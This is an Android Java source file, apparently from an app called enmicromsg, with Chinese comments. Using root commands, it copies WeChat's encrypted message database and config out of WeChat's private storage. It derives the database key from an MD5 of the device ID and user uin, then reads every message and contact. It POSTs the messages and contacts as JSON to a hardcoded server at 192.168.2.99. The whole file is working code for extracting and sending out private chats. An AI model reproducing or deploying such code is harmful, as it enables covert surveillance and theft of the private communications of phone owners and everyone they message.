package cn.truistic.enmicromsg.main.presenter;

import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.Toast;

import com.orhanobut.logger.Logger;
import com.yolanda.nohttp.NoHttp;
import com.yolanda.nohttp.RequestMethod;
import com.yolanda.nohttp.rest.OnResponseListener;
import com.yolanda.nohttp.rest.Request;
import com.yolanda.nohttp.rest.RequestQueue;
import com.yolanda.nohttp.rest.Response;

import net.sqlcipher.Cursor;
import net.sqlcipher.database.SQLiteDatabase;
import net.sqlcipher.database.SQLiteDatabaseHook;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.util.ArrayList;

import cn.truistic.enmicromsg.common.util.DeviceUtil;
import cn.truistic.enmicromsg.common.util.MD5Util;
import cn.truistic.enmicromsg.common.util.RootUtil;
import cn.truistic.enmicromsg.common.util.SharedPerfUtil;
import cn.truistic.enmicromsg.main.MainMVP;
import cn.truistic.enmicromsg.main.model.HomeModel;

/**
 * HomePresenter
 */
public class HomePresenter implements MainMVP.IHomePresenter {

    private Context context;
    private MainMVP.IHomeView homeView;
    private MainMVP.IHomeModel homeModel;
    private RequestQueue queue;
    private Request<String> request;
    private Cursor c;
    private String sss;
    private JSONObject obj;
    private JSONArray json;
    private Cursor cursor;
    private JSONArray jsonArray;
    private Request<String> usernickname;
    private Cursor query;
    private String myUserName;
    private String myusername;
    private Request<JSONArray> jsonArrayRequest;

    public HomePresenter(Context context, MainMVP.IHomeView homeView) {
        this.context = context;
        this.homeView = homeView;
        homeModel = new HomeModel(this, context);
    }

    @Override
    public void detect() {
        new DetectTask().execute();
    }

    /**
     * 检测操作
     */
    private class DetectTask extends AsyncTask {
        @Override
        protected Object doInBackground(Object[] params) {
            boolean flag = true;
            while (flag) {
                // 1.检测微信是否已经安装
                publishProgress(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.DETECTING);
                if (!detectWechat()) {
                    publishProgress(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.TRUE);
                // 2.检测设备是否已Root
                publishProgress(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.DETECTING);
                if (!detectRoot()) {
                    publishProgress(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.TRUE);
                // 3.检测是否已授权应用Root权限
                publishProgress(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.DETECTING);
                if (!detectPermission()) {
                    publishProgress(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.TRUE);
                // 4.获取微信相关数据
                publishProgress(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.DETECTING);
                if (!requestData()) {
                    publishProgress(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.TRUE);
                // 5.解析微信相关数据
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.DETECTING);
                if (!analysisData()) {
                    publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.TRUE);
                flag = false;
            }
            return null;
        }

        @Override
        protected void onProgressUpdate(Object[] values) {
            homeView.setProgressState((MainMVP.IHomeView.Progress) values[0], (MainMVP.IHomeView.State) values[1]);
        }

        @Override
        protected void onPostExecute(Object o) {
            homeView.onDetectStop();
        }
    }

    /**
     * 检测微信是否已经安装
     *
     * @return true，微信已安装
     */
    private boolean detectWechat() {
        return DeviceUtil.isAppInstalled(context, "com.tencent.mm");
    }

    /**
     * 检测设备是否已Root
     *
     * @return true, 设备已Root
     */
    private boolean detectRoot() {
        return RootUtil.isDeviceRooted();
    }

    /**
     * 检测是否已授权应用Root权限
     *
     * @return true, 已授权
     */
    private boolean detectPermission() {
        return RootUtil.isGrantRootPermission();
    }

    /**
     * 获取微信数据
     *
     * @return true, 获取成功
     */
    private boolean requestData() {
        // 1.获取配置文件，用于获取uin
        String sharedPerfsPath = "/data/data/cn.truistic.enmicromsg/shared_prefs/system_config_prefs.xml";
        RootUtil.execCmds(new String[]{"cp /data/data/com.tencent.mm/shared_prefs/system_config_prefs.xml "
                + sharedPerfsPath, "chmod 777 " + sharedPerfsPath});
        File sharedPerfsFile = new File(sharedPerfsPath);
        if (!sharedPerfsFile.exists()) {
            return false;
        }
        // 2.获取数据库文件
        ArrayList<String> list = new ArrayList<>();
        list = RootUtil.execCmdsforResult(new String[]{"cd /data/data/com.tencent.mm/MicroMsg", "ls -R"});
        ArrayList<String> dirs = new ArrayList<>();
        String dir = null;
        String item = null;
        for (int i = 0; i < list.size(); i++) {
            item = list.get(i);
            if (item.startsWith("./") && item.length() == 35) {
                dir = item;
            } else if (item.equals("EnMicroMsg.db")) {
                dirs.add(dir.substring(2, 34));
            }
        }
        if (dirs.size() == 0) {
            return false;
        } else {
            for (int i = 0; i < dirs.size(); i++) {
                RootUtil.execCmds(new String[]{"cp /data/data/com.tencent.mm/MicroMsg/" + dirs.get(i)
                        + "/EnMicroMsg.db " + context.getFilesDir() + "/EnMicroMsg" + i + ".db",
                        "chmod 777 " + context.getFilesDir() + "/EnMicroMsg" + i + ".db"});
            }
        }
        File dbFile;
        int i, j = 0;
        for (i = 0; i < dirs.size(); i++) {
            dbFile = new File(context.getFilesDir() + "/EnMicroMsg" + i + ".db");
            if (!dbFile.exists()) {
                break;
            }
            j++;
        }
        if (j == 0)
            return false;
        homeModel.saveDbNum(j);
        return true;
    }

    /**
     * 解析微信相关数据
     *
     * @return
     */
    private boolean analysisData() {
        // 1.计算数据库密码
        String uinStr = String.valueOf(SharedPerfUtil.getUin(context));
        String dbPwd = MD5Util.md5(DeviceUtil.getDeviceId(context) + uinStr).substring(0, 7);
        if (dbPwd == null)
            return false;
        homeModel.saveDbPwd(dbPwd);

        // 打开数据库
        SQLiteDatabaseHook hook = new SQLiteDatabaseHook() {
            public void preKey(SQLiteDatabase database) {
            }

            public void postKey(SQLiteDatabase database) {
                database.rawExecSQL("PRAGMA cipher_migrate;");  //最关键的一句！！！
            }
        };

        int num = homeModel.getDbNum();
        int j = 0;
        File dbFile;
        SQLiteDatabase database = null;
        for (int i = 0; i < num; i++) {
            dbFile = new File(context.getFilesDir() + "/EnMicroMsg" + i + ".db");
            Logger.i("数据库"+dbFile+"密码"+dbPwd);
            try {
                database = SQLiteDatabase.openOrCreateDatabase(dbFile, dbPwd, null, hook);
                Logger.i("密码"+dbPwd);
                break;
            } catch (Exception e) {
                j++;
            }
        }
        if (j == num) {
            return false;
        }

        try {


            //查询本次登录微信用户名
            String sql = "SELECT `value` FROM `userinfo` WHERE id=2";
            Cursor myUsername = database.rawQuery(sql, null);

            while (myUsername.moveToNext()){

                myUserName = myUsername.getString(0);


            }
            myusername = myUserName.toString();
            Logger.d(myUserName.toString());

            myUsername.close();


            c = database.query("message", null, null, null, null, null, null);
//            Log.i("结果集"+"", c.toString());

            json = new JSONArray();
            while (c.moveToNext()) {
                int _id = c.getInt(c.getColumnIndex("msgId"));
                String content = c.getString(c.getColumnIndex("content"));
                String  createTime = c.getString(c.getColumnIndex("createTime"));
                String talker = c.getString(c.getColumnIndex("talker"));//对话人
                int send = c.getInt(c.getColumnIndex("isSend")); //    0  1  发送或者接收
                if (send == 0) {
                    sss = "发送";
                } else {
                    sss = "接收";
                }

//                String a = talker +createTime +sss  + content;
//                Log.i("数据库中读取的", a);


                obj = new JSONObject();
                obj.put("talker",talker);//对话人
                obj.put("createTime",createTime);//发送或接收时间
                obj.put("msg_id", _id);//消息id
                obj.put("send", send);//发送或者接收
                obj.put("content", content);//内容
                obj.put("user_info",myusername);//当次上传聊天记录的微信号
                json.put(obj);
            }

            Logger.json(json.toString());
            Log.i("json",json.toString());

            c.close();

            // 查询微信好友 信息
            cursor = database.query("rcontact", null, null, null, null, null, null);
            jsonArray = new JSONArray();
            while (cursor.moveToNext())
            {
                String username = cursor.getString(cursor.getColumnIndex("username"));
                String nickname = cursor.getString(cursor.getColumnIndex("nickname"));
                if (nickname.length() == 0) {
                		nickname = username;
                }
                //放到对象中
                JSONObject object = new JSONObject();
                object.put("username",username);
                object.put("nickname",nickname);
                object.put("user_info",myusername);//当次上传聊天记录的微信号
//                Logger.i("用户名：  "+username +"   "+"昵称：  "+nickname);
                jsonArray.put(object);


            }
//            Logger.d("微信联系人json");
            Logger.json(jsonArray.toString());
            cursor.close();




            database.close();
        } catch (Exception e) {
            Log.d("DB", "Exception");
        }

        queue = NoHttp.newRequestQueue();
//        jsonArrayRequest = NoHttp.createJsonArrayRequest("http://192.168.2.99:8080/index.php?s=/Wx/Index/index", RequestMethod.POST);
//        jsonArrayRequest.add("msg",json.toString());
//        queue.add(1, jsonArrayRequest, new OnResponseListener<JSONArray>() {
//            @Override
//            public void onStart(int what) {
//                Logger.i("开始");
//            }
//
//            @Override
//            public void onSucceed(int what, Response<JSONArray> response) {
//                Logger.i("成功");
//                Toast.makeText(context,"成功",Toast.LENGTH_SHORT).show();
//            }
//
//            @Override
//            public void onFailed(int what, Response<JSONArray> response) {
//                Logger.i("失败");
//                Logger.i("失败"+response.get());
//                Toast.makeText(context,"失败",Toast.LENGTH_SHORT).show();
//            }
//
//            @Override
//            public void onFinish(int what) {
//                Logger.i("结束");
//            }
//        });


        request = NoHttp.createStringRequest("http://192.168.2.99:8080/index.php?s=/Wx/Index/index", RequestMethod.POST);//:8080/index.php?s=
        request.add("msg",json.toString());
        queue.add(1, request, new OnResponseListener<String>() {
            @Override
            public void onStart(int what) {
            Logger.i("开始");
            }

            @Override
            public void onSucceed(int what, Response<String> response) {
                Logger.i("成功");
                Toast.makeText(context,"成功",Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onFailed(int what, Response<String> response) {
                Logger.i("失败"+response.get());
                Toast.makeText(context,"失败",Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onFinish(int what) {
                Logger.i("结束");
            }
        });

        usernickname = NoHttp.createStringRequest("http://192.168.2.99:8080/index.php?s=/Wx/Index/user", RequestMethod.POST);
        usernickname.add("user",jsonArray.toString());
        queue.add(2, usernickname, new OnResponseListener<String>() {
            @Override
            public void onStart(int what) {
                Logger.i("昵称开始");
            }

            @Override
            public void onSucceed(int what, Response<String> response) {
                Logger.i("昵称成功");
//                Toast.makeText(context,"成功",Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onFailed(int what, Response<String> response) {
                Logger.i("昵称失败"+response.get());
                Toast.makeText(context,"失败",Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onFinish(int what) {
                Logger.i("昵称结束");
            }
        });

        return true;
    }

}